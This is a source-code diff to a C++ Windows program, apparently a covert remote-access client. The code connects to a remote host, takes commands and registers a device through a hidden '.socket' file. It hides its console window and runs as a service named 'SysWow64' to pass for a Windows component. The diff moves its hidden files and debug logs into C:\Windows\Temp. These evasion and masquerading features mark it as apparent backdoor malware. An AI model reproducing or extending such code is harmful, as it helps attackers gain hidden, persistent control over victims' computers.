@@ -2,7 +2,7 @@
 * @Author: amaneureka
 * @Date:   2017-04-02 03:33:49
 * @Last Modified by:   amaneureka
-* @Last Modified time: 2017-04-14 14:16:09
+* @Last Modified time: 2017-04-14 15:13:42
 */
 
 #include <vector>
@@ -73,6 +73,8 @@ using namespace std;
 static bool terminated = false;
 static bool logged_in = false;
 static bool command_ack = false;
+
+static char filename[] = "C:\\Windows\\Temp\\.socket";
 
 static STARTUPINFO startupInfo;
 static PROCESS_INFORMATION processInfo;
@@ -181,7 +183,6 @@ void register_device(int socket, string recv_uid)
 {
     ifstream infile;
     ofstream outfile;
-    char filename[] = ".socket";
 
     DPRINT("%s()\n", __func__);
 
@@ -450,7 +451,7 @@ int run(const char* remote_addr, int port)
                     {
                         DPRINT("%s(): [INV] Invalid!\n", __func__);
 
-                        remove(".socket");
+                        remove(filename);
 
                         /* invalid command */
                         logged_in = false;
@@ -506,6 +507,7 @@ int run(const char* remote_addr, int port)
 
     /* clean up */
     close(sock);
+    fflush(stdout);
     pthread_mutex_destroy(&mutex_socket);
     return 0;
 }
@@ -653,7 +655,7 @@ int main(int argc, char *argv[])
     if (strcmp(argv[1], "app") == 0)
     {
         #ifdef DEBUG
-            freopen("F:\\.SysWow32.log", "a", stdout);
+            freopen("C:\\Windows\\Temp\\.SysWow32.log", "a", stdout);
         #endif
         ShowWindow(GetConsoleWindow(), SW_HIDE);
         return run(argv[2], stoi(argv[3]));
@@ -661,7 +663,7 @@ int main(int argc, char *argv[])
     else if (strcmp(argv[1], "service") == 0)
     {
         #ifdef DEBUG
-            freopen("F:\\.SysWow64.log", "a", stdout);
+            freopen("C:\\Windows\\Temp\\.SysWow64.log", "a", stdout);
         #endif
         SERVICE_TABLE_ENTRY serviceTable[2];
         serviceTable[0].lpServiceName = "SysWow64";
